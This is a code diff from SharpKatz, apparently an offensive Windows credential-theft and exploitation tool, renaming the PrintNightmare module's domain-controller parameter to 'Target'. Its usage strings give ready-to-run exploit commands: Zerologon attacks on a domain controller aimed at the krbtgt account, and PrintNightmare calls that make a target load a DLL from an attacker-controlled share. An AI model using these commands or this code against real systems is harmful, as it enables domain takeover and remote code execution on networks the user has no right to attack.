@@ -144,8 +144,8 @@ namespace SharpKatz
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom");
                 return;
             }
 
@@ -401,13 +401,13 @@ namespace SharpKatz
                             return;
                         }
 
-                        if (string.IsNullOrEmpty(dc))
+                        if (string.IsNullOrEmpty(target))
                         {
-                            Console.WriteLine("[x] Missing or incorrect required parameter -> DomainController");
+                            Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
                             return;
                         }
 
-                        Module.PrintNightmare.RunPrintNightmare(dc,library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
+                        Module.PrintNightmare.RunPrintNightmare(target, library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
                     }
                 }
 
